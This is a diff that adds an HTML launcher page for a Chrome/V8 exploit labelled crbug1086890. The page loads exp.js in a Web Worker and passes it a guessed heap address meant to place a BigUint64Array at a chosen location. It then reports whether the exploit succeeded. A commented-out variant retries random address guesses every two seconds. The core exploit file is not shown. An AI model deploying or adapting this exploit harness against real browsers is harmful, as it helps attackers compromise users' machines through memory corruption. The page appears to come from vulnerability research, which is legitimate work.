@@ -1,0 +1,69 @@
+<html>
+<title>crbug1086890</title>
+
+<script src="exp.js"></script>
+<script>
+
+
+/*
+range :
+
+0x2424242408**0001n
+
+Guess **, just make sure our BigUint64Array behind 08**0001.
+
+*/
+// function getRandom (n, m) {
+//     var num = Math.floor(Math.random() * (m - n + 1) + n)
+//     return num
+// }
+
+// var worker;
+// var exploitSucc = false;
+
+// function startExploit() {
+//     if(exploitSucc){
+//         return;
+//     }
+//     worker = new Worker('exp.js');
+    
+//     var tmp = getRandom(0x00, 0xff);
+//     var addr = 0x2424242408000000 + tmp * 0x10000;
+//     var addr_bigint = BigInt(addr);
+//     worker.postMessage(addr_bigint + 1n);
+
+//     worker.onmessage = function (e) {
+//         exploitSucc = e.data;
+//         if (exploitSucc == false) {
+//             document.write("exploit failed, retry....<hr>");
+//             return;
+//         }
+//         document.write("exploit done!!!!!<hr>");
+//     }
+// }
+
+// startExploit();
+
+// var hangMonitor = setInterval(function () {
+//     if (exploitSucc == true) {
+//         clearInterval(hangMonitor);
+//     } else {
+//         startExploit();
+//     }
+// }, 2000);
+
+
+var worker = new Worker('exp.js');
+worker.postMessage(0x2424242408500001n);
+worker.onmessage = function (e) {
+    exploitSucc = e.data;
+    if (exploitSucc == false) {
+        document.write("exploit failed, retry....<hr>");
+        return;
+    }
+    document.write("exploit done!!!!!<hr>");
+}
+
+</script>
+
+</html>
